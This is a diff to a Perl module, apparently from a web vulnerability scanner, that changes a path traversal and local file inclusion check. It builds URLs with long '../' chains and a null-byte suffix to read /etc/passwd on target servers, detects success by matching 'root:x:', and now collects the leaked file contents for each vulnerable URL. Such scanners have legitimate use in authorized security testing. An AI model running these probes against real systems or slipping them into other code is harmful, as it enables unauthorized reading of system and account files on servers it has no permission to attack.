@@ -4,13 +4,14 @@ use Resources::Network::HTTPInterface;
 
 has 'Crawler';
 has 'Bug';
-has 'Test'      => sub {"/proc/self/environ"};
-has 'TestRegex' => sub {"DOCUMENT_ROOT=\/|HTTP_USER_AGENT"};
+has 'Test'      => sub {"/etc/passwd"};
+has 'TestRegex' => sub {"root:x:"};
 
 
 sub test() {
     my $self = shift;
-    my @URLS = @{ $self->Crawler->stripLinks };
+    my @URLS = @_;
+    my %Res;
     foreach my $url (@URLS) {
         $self->Init->getIO()->print_info("Trying against $url");
         my $Test
@@ -18,14 +19,15 @@ sub test() {
             . $url
             . $self->Bug
             . "../../../../../../../../../../../../../"
-            . $self->Test . "%0000";
+            . $self->Test . '%0000';
         my $response=Resources::Network::HTTPInterface->new->get($Test);
         my $Content = $response->{content};
         my $r       = $self->TestRegex;
         if ( $Content =~ /$r/i ) {
-            $self->Init->getIO()->print_info( $Test . " is vulnerable" );
+            $Res{$Test}= $Content;
         }
     }
+    return %Res;
 }
 
 1;
